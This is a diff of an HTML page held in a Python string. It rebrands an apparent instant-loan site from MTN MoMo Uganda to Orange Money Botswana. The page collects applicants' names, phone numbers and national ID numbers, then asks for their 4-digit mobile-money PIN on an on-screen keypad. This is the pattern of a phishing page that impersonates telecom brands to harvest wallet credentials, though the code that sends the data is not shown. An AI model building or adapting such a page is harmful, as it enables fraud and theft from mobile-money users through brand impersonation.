ltLBwAAAAASUVORK5CYII=" alt="MTN Logo" class="h-20 w-auto mx-auto mb-4"><h2 class="text-xs tracking-widest font-bold text-[#004F71] uppercase">Uganda • Mobile Money</h2><h1 class="text-3xl sm:text-4xl font-extrabold text-[#004F71] mt-1 tracking-tight uppercase">MoMo Loans</h1><p class="text-slate-600 text-sm mt-1">Instant, flexible financial relief straight to your MTN wallet.</p>
+    <!-- SCREEN 1: HOME -->
+    <section id="screen-home" class="space-y-4">
+      
+      <!-- Orange Hero Card (Black & Orange Iconic Look) -->
+      <div class="relative overflow-hidden rounded-3xl bg-gradient-to-br from-black via-zinc-950 to-neutral-900 text-white p-6 sm:p-8 shadow-xl border border-zinc-800">
+        <!-- Ambient Orange Glow -->
+        <div class="absolute -right-12 -bottom-12 w-52 h-52 rounded-full bg-[#FF7900]/25 blur-3xl pointer-events-none"></div>
+        <div class="absolute -left-10 -top-10 w-40 h-40 rounded-full bg-[#FF7900]/15 blur-2xl pointer-events-none"></div>
+        
+        <div class="relative z-10 space-y-4">
+          <div class="flex items-center gap-2">
+            <span class="inline-flex items-center gap-1.5 bg-[#FF7900] text-black font-extrabold px-3 py-1 rounded-full text-xs uppercase tracking-wider shadow-sm">
+              <span>⚡</span> Fast Mobile Loan
+            </span>
+          </div>
+          
+          <div>
+            <h1 class="text-3xl sm:text-4xl font-black tracking-tight leading-tight">
+              <span class="text-[#FF7900]">Orange</span> is here.
+            </h1>
+            <p class="text-2xl sm:text-3xl font-extrabold text-white mt-1">
+              Loans Up To <span class="text-[#FF7900]">P 10,000</span>
+            </p>
+          </div>
+          
+          <p class="text-zinc-300 text-sm max-w-md leading-relaxed">
+            Directly to your Orange Money Botswana wallet in under 2 minutes. No paperwork, no queues, no collateral required.
+          </p>
+
+          <div class="pt-2">
+            <button onclick="goTo('apply')" class="w-full sm:w-auto px-8 py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-lg shadow-orange-500/20 transition-all active:scale-[0.99] flex items-center justify-center gap-2">
+              <span>APPLY NOW</span>
+              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
+            </button>
+          </div>
+        </div>
       </div>
 
-      <!-- 4 Benefits -->
+      <!-- 4 Benefits Cards -->
       <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
-        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
-          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">⚡</div>
+        <div class="bg-white p-3.5 rounded-2xl border border-slate-200/80 shadow-xs flex flex-col items-center text-center">
+          <div class="w-10 h-10 rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center font-bold text-lg mb-2">⚡</div>
           <span class="text-xs font-bold text-slate-800">Instant Payout</span>
         </div>
-        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
-          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">📱</div>
+        <div class="bg-white p-3.5 rounded-2xl border border-slate-200/80 shadow-xs flex flex-col items-center text-center">
+          <div class="w-10 h-10 rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center font-bold text-lg mb-2">📱</div>
           <span class="text-xs font-bold text-slate-800">100% Mobile</span>
         </div>
-        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
-          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">📄</div>
+        <div class="bg-white p-3.5 rounded-2xl border border-slate-200/80 shadow-xs flex flex-col items-center text-center">
+          <div class="w-10 h-10 rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center font-bold text-lg mb-2">📄</div>
           <span class="text-xs font-bold text-slate-800">Clear Terms</span>
         </div>
-        <div class="bg-white p-3 rounded-2xl border border-slate-200/80 shadow-sm flex flex-col items-center text-center">
-          <div class="w-10 h-10 rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center font-bold mb-2">🔒</div>
-          <span class="text-xs font-bold text-slate-800">Secure</span>
+        <div class="bg-white p-3.5 rounded-2xl border border-slate-200/80 shadow-xs flex flex-col items-center text-center">
+          <div class="w-10 h-10 rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center font-bold text-lg mb-2">🔒</div>
+          <span class="text-xs font-bold text-slate-800">Bank Grade Security</span>
         </div>
       </div>
 
-      <!-- MTN MoMo Hero Card -->
-      <div class="relative overflow-hidden  bg-gradient-to-br from-[#004F71] via-[#00334E] to-[#002233] text-white p-6 shadow-lg">
-        <div class="absolute -right-10 -bottom-10 w-44 h-44 rounded-full bg-[#FFCC00]/10 blur-xl pointer-events-none"></div>
-        <div class="relative z-10 space-y-3">
-          <span class="inline-block bg-[#FFCC00] text-[#004F71] px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">Fast Mobile Access</span>
-          <h3 class="text-2xl sm:text-3xl font-black leading-tight">Loans Up To UGX 1,000,000 INSTANTLY!</h3>
-          <p class="text-blue-100 text-sm max-w-md">No paperwork, no standing in lines. Apply directly from your phone in under 2 minutes.</p>
+      <!-- Purpose Selector -->
+      <div class="bg-white p-4 rounded-2xl border border-slate-200/80 shadow-xs">
+        <h4 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2.5">Select Loan Purpose</h4>
+        <div class="flex gap-2.5 overflow-x-auto pb-1 hide-scrollbar">
+          <button onclick="setPurpose('Business')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-xl bg-slate-50 border border-slate-200 font-bold text-xs text-slate-700 hover:border-[#FF7900] hover:text-[#FF7900] transition-all">💼 Business</button>
+          <button onclick="setPurpose('School')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-xl bg-slate-50 border border-slate-200 font-bold text-xs text-slate-700 hover:border-[#FF7900] hover:text-[#FF7900] transition-all">🎓 School Fees</button>
+          <button onclick="setPurpose('Emergency')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-xl bg-slate-50 border border-slate-200 font-bold text-xs text-slate-700 hover:border-[#FF7900] hover:text-[#FF7900] transition-all">🚨 Emergency</button>
+          <button onclick="setPurpose('Household')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-xl bg-slate-50 border border-slate-200 font-bold text-xs text-slate-700 hover:border-[#FF7900] hover:text-[#FF7900] transition-all">🏠 Household</button>
+          <button onclick="setPurpose('Travel')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-xl bg-slate-50 border border-slate-200 font-bold text-xs text-slate-700 hover:border-[#FF7900] hover:text-[#FF7900] transition-all">✈️ Travel</button>
         </div>
       </div>
 
-      <!-- Purpose Selector Carousel -->
-      <div>
-        <h4 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Loan Purpose</h4>
-        <div class="flex gap-3 overflow-x-auto pb-2 hide-scrollbar">
-          <button onclick="setPurpose('Business')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">💼 Business</button>
-          <button onclick="setPurpose('School')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🎓 School</button>
-          <button onclick="setPurpose('Emergency')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🚨 Emergency</button>
-          <button onclick="setPurpose('Household')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">🏠 Household</button>
-          <button onclick="setPurpose('Travel &')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-2xl bg-white border border-slate-200 font-semibold text-xs text-slate-700 shadow-sm hover:border-[#004F71]">✈️ Travel &</button>
-        </div>
-      </div>
-
-      <button onclick="goTo('apply')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
-        APPLY NOW
+      <!-- Apply Button -->
+      <button onclick="goTo('apply')" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
+        GET STARTED
       </button>
     </section>
 
     <!-- SCREEN 2: APPLY FOR LOAN -->
     <section id="screen-apply" class="hidden space-y-5">
-  <div class="flex items-center gap-3">
-    <button onclick="goTo('home')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
-    <div>
-      <h2 class="text-xl font-black text-[#004F71]">APPLY FOR LOAN</h2>
-      <p class="text-xs text-slate-500">Step 1 of 4 • Personal details</p>
-    </div>
-  </div>
-
-  <!-- Wrapped inputs inside a standard <form> tag to make the 'required' feature work seamlessly -->
-  <form id="loan-application-form" onsubmit="handleFormSubmit(event)" class="space-y-5">
-    <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-4">
-      
-      <div>
-        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Full Name</label>
-        <input id="input-fullname" type="text" placeholder="John Doe" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
-      </div>
-      
-      <div>
-        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Mobile Number</label>
-        <input id="input-mobile" type="tel" placeholder="0770000000" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
-      </div>
-      
-      <div>
-        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">ID Number</label>
-        <input id="input-nationalid" type="text" placeholder="National ID Number" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
-      </div>
-      
-      <div>
-        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Date of Birth</label>
-        <input id="input-dob" type="date" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
-      </div>
-      
-      <div>
-        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Loan Purpose</label>
-        <select id="input-purpose" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
-          <option value="" disabled selected>Select a purpose...</option>
-          <option value="Business">Business Capital</option>
-          <option value="School">School Fees</option>
-          <option value="Emergency">Medical & Emergency</option>
-          <option value="Household">Household Support</option>
-          <option value="Travel &">Travel & Logistics</option>
-        </select>
-      </div>
-      
-      <div>
-        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Loan Amount (UGX)</label>
-        <input id="input-amount" type="number" placeholder="e.g. 2500" min="50000" max="1000000" step="50000" oninput="syncAmount(this.value, true)" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
-      </div>
-
-    </div>
-
-    <!-- The button is now a submit type to enforce the required checks -->
-    <button type="submit" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
-      CONTINUE
-    </button>
-  </form>
-</section>
-
-
-    <!-- SCREEN 3: LOAN DETAILS & REPAYMENT -->
-    <section id="screen-loan" class="hidden space-y-5">
       <div class="flex items-center gap-3">
-        <button onclick="goTo('apply')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50 transition-all">←</button>
+        <button onclick="goTo('home')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
         <div>
-          <h2 class="text-xl font-black text-[#004F71]">LOAN DETAILS</h2>
-          <p class="text-xs text-slate-500">Step 2 of 4 • Select period & review breakdown</p>
+          <h2 class="text-xl font-black text-slate-900">APPLY FOR LOAN</h2>
+          <p class="text-xs text-slate-500">Step 1 of 4 • Personal & Account Details</p>
         </div>
       </div>
 
-      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-sm space-y-6">
+      <form id="loan-application-form" onsubmit="handleFormSubmit(event)" class="space-y-4">
+        <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-4">
+          
+          <div>
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Full Name (As on Omang / ID)</label>
+            <input id="input-fullname" type="text" placeholder="Lesedi Molefe" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] text-sm font-semibold">
+          </div>
+          
+          <div>
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Orange Money Mobile Number</label>
+            <div class="relative">
+              <input id="input-mobile" type="tel" placeholder="72 123 456" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] text-sm font-semibold">
+            </div>
+            <p class="text-[11px] text-slate-400 mt-1">Enter your 8-digit Botswana mobile number. Funds will be disbursed to your Orange Money wallet.</p>
+          </div>
+
+          <div>
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Omang (National ID) / Passport Number</label>
+            <input id="input-nationalid" type="text" placeholder="123456789" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] text-sm font-semibold uppercase">
+          </div>
+
+          <div>
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Loan Purpose</label>
+            <select id="input-purpose" class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] text-sm font-semibold bg-white">
+              <option value="Business">💼 Business Expansion / Working Capital</option>
+              <option value="School">🎓 School & Tuition Fees</option>
+              <option value="Emergency">🚨 Medical & Emergency</option>
+              <option value="Household">🏠 Household & Utilities</option>
+              <option value="Travel">✈️ Travel & Transport</option>
+            </select>
+          </div>
+
+          <div>
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Requested Loan Amount (Pula - BWP)</label>
+            <input id="input-amount" type="number" min="100" max="10000" step="100" value="1500" oninput="syncAmount(this.value, true)" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] text-sm font-black text-[#FF7900]">
+          </div>
+        </div>
+
+        <button type="submit" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
+          NEXT STEP
+        </button>
+      </form>
+    </section>
+
+    <!-- SCREEN 3: LOAN CONFIGURATION -->
+    <section id="screen-loan" class="hidden space-y-5">
+      <div class="flex items-center gap-3">
+        <button onclick="goTo('apply')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
+        <div>
+          <h2 class="text-xl font-black text-slate-900">LOAN AMOUNT & PERIOD</h2>
+          <p class="text-xs text-slate-500">Step 2 of 4 • Select repayment schedule</p>
+        </div>
+      </div>
+
+      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-6">
         <div class="text-center">
           <div class="text-xs font-bold text-slate-400 uppercase tracking-wider">Requested Amount</div>
-          <div id="display-amount" class="text-4xl font-black text-[#004F71] mt-1">UGX 500,000</div>
-          <input type="range" id="amount-slider" min="50000" max="1000000" step="50000" value="500000" oninput="syncAmount(this.value)" class="w-full mt-4 accent-[#FFCC00]">
+          <div id="display-amount" class="text-4xl font-black text-[#FF7900] mt-1">P 1,500</div>
+          <input type="range" id="amount-slider" min="100" max="10000" step="100" value="1500" oninput="syncAmount(this.value)" class="w-full mt-4 accent-[#FF7900]">
           <div class="flex justify-between text-xs text-slate-400 mt-1 font-semibold">
-            <span>UGX 50,000</span>
-            <span>UGX 1,000,000</span>
+            <span>P 100</span>
+            <span>P 10,000</span>
           </div>
         </div>
 
@@ -360,62 +348,62 @@ HTML_PAGE = r"""<!DOCTYPE html>
           <div>
             <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Repayment Period</label>
             <div class="grid grid-cols-5 gap-2">
-              <button type="button" onclick="setPeriod(7)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">7 Days</button>
-              <button type="button" onclick="setPeriod(14)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">14 Days</button>
-              <button type="button" onclick="setPeriod(30)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all bg-[#004F71] text-[#FFCC00] border-[#004F71] shadow-sm">30 Days</button>
-              <button type="button" onclick="setPeriod(60)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">60 Days</button>
-              <button type="button" onclick="setPeriod(90)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#004F71]">90 Days</button>
+              <button type="button" onclick="setPeriod(7)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FF7900]">7 Days</button>
+              <button type="button" onclick="setPeriod(14)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FF7900]">14 Days</button>
+              <button type="button" onclick="setPeriod(30)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all bg-[#FF7900] text-black border-[#FF7900] shadow-xs">30 Days</button>
+              <button type="button" onclick="setPeriod(60)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FF7900]">60 Days</button>
+              <button type="button" onclick="setPeriod(90)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FF7900]">90 Days</button>
             </div>
           </div>
 
           <div>
-            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Or Choose Specific Date</label>
-            <input type="date" id="input-repay-date" onchange="setCustomDate(this.value)" class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Or Select Custom Due Date</label>
+            <input type="date" id="input-repay-date" onchange="setCustomDate(this.value)" class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] text-sm font-semibold">
           </div>
         </div>
 
         <div class="border-t border-slate-100 pt-4 space-y-2.5 text-sm">
           <div class="flex justify-between text-slate-600">
             <span>Interest (5%)</span>
-            <span id="breakdown-interest" class="font-bold text-slate-800">UGX 50</span>
+            <span id="breakdown-interest" class="font-bold text-slate-800">P 75.00</span>
           </div>
           <div class="flex justify-between text-slate-600">
             <span>Admin & Processing Fee (3%)</span>
-            <span id="breakdown-fee" class="font-bold text-slate-800">UGX 30</span>
+            <span id="breakdown-fee" class="font-bold text-slate-800">P 45.00</span>
           </div>
           <div class="flex justify-between text-slate-600">
             <span>Repayment Due Date</span>
             <span id="breakdown-date" class="font-bold text-slate-800">30/09/2026</span>
           </div>
-          <div class="flex justify-between text-base font-extrabold text-[#004F71] pt-2 border-t border-slate-100">
+          <div class="flex justify-between text-base font-extrabold text-slate-900 pt-2 border-t border-slate-100">
             <span>Total Repayment</span>
-            <span id="breakdown-total" class="text-[#004F71]">UGX 1,080</span>
+            <span id="breakdown-total" class="text-[#FF7900] font-black">P 1,620.00</span>
           </div>
         </div>
       </div>
 
-      <button onclick="goTo('review', true)" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
-        CONTINUE
+      <button onclick="goTo('review', true)" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
+        CONTINUE TO REVIEW
       </button>
     </section>
 
     <!-- SCREEN 4: REVIEW APPLICATION -->
     <section id="screen-review" class="hidden space-y-5">
       <div class="flex items-center gap-3">
-        <button onclick="goTo('loan')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50 transition-all">←</button>
+        <button onclick="goTo('loan')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
         <div>
-          <h2 class="text-xl font-black text-[#004F71]">REVIEW APPLICATION</h2>
-          <p class="text-xs text-slate-500">Step 3 of 4 • Verify all details before submission</p>
+          <h2 class="text-xl font-black text-slate-900">REVIEW APPLICATION</h2>
+          <p class="text-xs text-slate-500">Step 3 of 4 • Verify details before submission</p>
         </div>
       </div>
 
-      <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-4">
+      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-4">
         <div>
           <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Applicant</h3>
           <div class="bg-slate-50 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
-            <div class="flex justify-between"><span class="text-slate-500">Full Name</span><span id="review-name" class="font-bold text-slate-800">Tariro Moyo</span></div>
-            <div class="flex justify-between"><span class="text-slate-500">Mobile Number</span><span id="review-mobile" class="font-bold text-slate-800">+263 77 123 4567</span></div>
-            <div class="flex justify-between"><span class="text-slate-500">ID Number</span><span id="review-id" class="font-bold text-slate-800">63-123456-A-47</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">Full Name</span><span id="review-name" class="font-bold text-slate-800">Lesedi Molefe</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">Orange Money Mobile</span><span id="review-mobile" class="font-bold text-slate-800">+267 72 123 456</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">ID Number (Omang)</span><span id="review-id" class="font-bold text-slate-800">123456789</span></div>
           </div>
         </div>
 
@@ -423,26 +411,26 @@ HTML_PAGE = r"""<!DOCTYPE html>
           <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Loan Summary</h3>
           <div class="bg-slate-50 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
             <div class="flex justify-between"><span class="text-slate-500">Purpose</span><span id="review-purpose" class="font-bold text-slate-800">Business</span></div>
-            <div class="flex justify-between"><span class="text-slate-500">Principal</span><span id="review-principal" class="font-bold text-slate-800">UGX 100,000</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">Principal</span><span id="review-principal" class="font-bold text-[#FF7900]">P 1,500</span></div>
             <div class="flex justify-between"><span class="text-slate-500">Period</span><span id="review-period" class="font-bold text-slate-800">30 Days</span></div>
           </div>
         </div>
 
         <div>
           <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Repayment</h3>
-          <div class="bg-blue-50/70 border border-blue-100 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
-            <div class="flex justify-between"><span class="text-slate-600">Total Payable</span><span id="review-total" class="font-extrabold text-blue-800">UGX 1,080</span></div>
+          <div class="bg-orange-50/70 border border-orange-100 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
+            <div class="flex justify-between"><span class="text-slate-600">Total Payable</span><span id="review-total" class="font-extrabold text-[#FF7900]">P 1,620.00</span></div>
             <div class="flex justify-between"><span class="text-slate-600">Due Date</span><span id="review-date" class="font-bold text-slate-800">30/09/2026</span></div>
           </div>
         </div>
 
         <label class="flex items-start gap-3 pt-2 cursor-pointer">
-          <input type="checkbox" id="confirm-check" onchange="toggleConfirm(this.checked)" class="mt-1 h-4 w-4 rounded accent-[#FFCC00]">
-          <span class="text-xs text-slate-600 leading-snug">I confirm that the information provided is correct and agree to MTN MoMo loan terms and conditions.</span>
+          <input type="checkbox" id="confirm-check" onchange="toggleConfirm(this.checked)" class="mt-1 h-4 w-4 rounded accent-[#FF7900]">
+          <span class="text-xs text-slate-600 leading-snug">I confirm that the information provided is correct and agree to Orange Money loan terms and conditions.</span>
         </label>
       </div>
 
-      <button id="btn-confirm" onclick="goTo('pin', true)" disabled class="w-full py-4 rounded-2xl  disabled:bg-slate-300 disabled:cursor-not-allowed hover:bg-blue-700 text-white font-bold text-base tracking-wide shadow-md transition-all">
+      <button id="btn-confirm" onclick="goTo('pin', true)" disabled class="w-full py-4 rounded-2xl bg-slate-300 cursor-not-allowed text-slate-500 font-black text-base tracking-wide shadow-md transition-all">
         CONFIRM APPLICATION
       </button>
     </section>
@@ -450,60 +438,62 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <!-- SCREEN 5: ENTER YOUR PIN -->
     <section id="screen-pin" class="hidden space-y-6">
       <div class="text-center pt-2">
-        <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">🔒</div>
-        <h2 class="text-2xl font-black text-[#004F71]">ENTER YOUR PIN</h2>
-        <p class="text-xs text-slate-500 mt-1">Please enter your 4-digit MTN MoMo PIN to authorize</p>
+        <div class="w-14 h-14 mx-auto rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center text-2xl mb-3 shadow-inner">🔒</div>
+        <h2 class="text-2xl font-black text-slate-900">ENTER YOUR PIN</h2>
+        <p class="text-xs text-slate-500 mt-1">Please enter your 4-digit Orange Money PIN to authorize</p>
       </div>
 
-      <!-- PIN Indicator Dots -->
-      <div class="flex justify-center gap-4 my-4">
-        <div id="dot-0" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
-        <div id="dot-1" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
-        <div id="dot-2" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
-        <div id="dot-3" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
+      <!-- PIN Dots -->
+      <div class="flex justify-center gap-4 py-2">
+        <div id="dot-0" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all duration-200"></div>
+        <div id="dot-1" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all duration-200"></div>
+        <div id="dot-2" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all duration-200"></div>
+        <div id="dot-3" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all duration-200"></div>
       </div>
 
-      <!-- Realistic Numeric Keypad -->
-      <div id="pin-keypad" class="max-w-[320px] mx-auto grid grid-cols-3 gap-3 transition-all duration-300">
-        <button onclick="pressPin('1')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">1</button>
-        <button onclick="pressPin('2')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">2</button>
-        <button onclick="pressPin('3')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">3</button>
-        <button onclick="pressPin('4')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">4</button>
-        <button onclick="pressPin('5')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">5</button>
-        <button onclick="pressPin('6')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">6</button>
-        <button onclick="pressPin('7')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">7</button>
-        <button onclick="pressPin('8')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">8</button>
-        <button onclick="pressPin('9')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">9</button>
-        <button onclick="clearPin()" class="h-16 rounded-2xl bg-slate-100 text-xs font-bold text-slate-600 active:bg-slate-200">C</button>
-        <button onclick="pressPin('0')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">0</button>
-        <button onclick="backspacePin()" class="h-16 rounded-2xl bg-slate-100 text-lg font-bold text-slate-600 active:bg-slate-200">⌫</button>
-      </div>
+      <div id="pin-status-msg" class="text-center text-xs font-bold text-[#FF7900] min-h-[18px]"></div>
 
-      <div id="pin-status-msg" class="text-center text-xs font-semibold text-slate-400 h-4"></div>
+      <!-- Keypad -->
+      <div class="max-w-[280px] mx-auto grid grid-cols-3 gap-3">
+        <button type="button" onclick="pressPin('1')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">1</button>
+        <button type="button" onclick="pressPin('2')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">2</button>
